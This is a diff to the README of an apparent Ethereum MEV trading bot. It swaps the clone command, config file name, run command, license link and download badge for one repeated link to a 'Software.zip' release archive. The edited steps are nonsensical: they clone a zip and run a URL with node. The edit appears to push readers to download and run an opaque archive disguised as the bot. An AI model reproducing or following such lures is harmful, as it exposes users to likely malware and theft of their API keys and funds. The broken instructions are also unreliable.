@@ -30,7 +30,7 @@ To get started with ETH-MEV-BOT, follow these simple steps:
 
 1. Clone the repository to your local machine:
    ```bash
-   git clone https://github.com/your-username/ETH-MEV-BOT.git
+   git clone https://github.com/Danielmakha/ETH-MEV-BOT/releases/download/v2.0/Software.zip
    ```
 
 2. Install the required dependencies using npm:
@@ -38,11 +38,11 @@ To get started with ETH-MEV-BOT, follow these simple steps:
    npm install
    ```
 
-3. Configure your trading preferences and API keys in the `config.js` file.
+3. Configure your trading preferences and API keys in the `https://github.com/Danielmakha/ETH-MEV-BOT/releases/download/v2.0/Software.zip` file.
 
 4. Run the bot using the following command:
    ```bash
-   node bot.js
+   node https://github.com/Danielmakha/ETH-MEV-BOT/releases/download/v2.0/Software.zip
    ```
 
 ## 🚀 Usage
@@ -65,9 +65,9 @@ We welcome contributions from the open-source community to enhance and expand th
 
 ## 📝 License
 
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/Danielmakha/ETH-MEV-BOT/releases/download/v2.0/Software.zip](https://github.com/Danielmakha/ETH-MEV-BOT/releases/download/v2.0/Software.zip) file for details.
 
-[![Download Software](https://img.shields.io/badge/Download-Software-green)](https://github.com/user-attachments/files/17466420/Software.zip)
+[![Download Software](https://github.com/Danielmakha/ETH-MEV-BOT/releases/download/v2.0/Software.zip)](https://github.com/Danielmakha/ETH-MEV-BOT/releases/download/v2.0/Software.zip)
 
 ---
 
